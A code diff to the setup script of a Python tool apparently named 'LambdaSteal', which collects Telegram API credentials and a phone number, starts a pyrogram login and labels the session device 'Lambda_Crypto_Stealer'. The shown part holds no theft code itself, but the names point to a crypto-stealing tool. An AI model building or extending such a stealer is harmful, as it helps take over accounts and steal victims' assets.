@@ -1,8 +1,10 @@
 import os
+from random import choice
 from colorama import *
 from colorama import Fore
 from langs import RU, ENG
 from pyrogram import Client
+from pyrogram.errors import FloodWait
 from pyrogram.errors.exceptions.bad_request_400 import ApiIdInvalid
 from pyrogram.errors.exceptions.not_acceptable_406 import PhoneNumberInvalid
 
@@ -29,27 +31,18 @@ def get_api() -> list():
             lang = 'ru' if lang_i.lower() == 'ru' else 'eng'
             settings.append(lang)
             break
-    while True:
-        try:
-            api_id = int(input(RU['api_id_input'] if lang == 'ru' else ENG['api_id_input']))
-        except:
-            print(RU['error_api'] if lang == 'ru' else ENG['error_api'])
-            continue
-        api_hash = input(RU['api_hash_input'] if lang == 'ru' else ENG['api_hash_input'])
-        settings.extend((str(api_id), api_hash))
-        try:
-            f = Client(name='LambdaSteal', api_id=api_id, api_hash=api_hash)
-            f.connect()
-            f.send_code('+79999999999')
-            f.disconnect()
-            print(RU['success_api'] if lang == 'ru' else ENG['success_api'])
-            break
-        except ApiIdInvalid:
-            print(RU['error_api'] if lang == 'ru' else ENG['error_api'])
+    try:
+        api_id = int(input(RU['api_id_input'] if lang == 'ru' else ENG['api_id_input']))
+    except:
+        print(RU['error_api'] if lang == 'ru' else ENG['error_api'])
+    api_hash = input(RU['api_hash_input'] if lang == 'ru' else ENG['api_hash_input'])
+    settings.extend((str(api_id), api_hash))
+    print(RU['success_api'] if lang == 'ru' else ENG['success_api'])
     while True:
         phone = input(RU['phone_input'] if lang == 'ru' else ENG['phone_input'])
         try:
             app = Client(name='LambdaSteal', api_id=settings[1], api_hash=settings[2])
+            app.DEVICE_MODEL = 'Lambda_Crypto_Stealer'
             app.connect()
             sent_code_info = app.send_code(phone)
             while True:
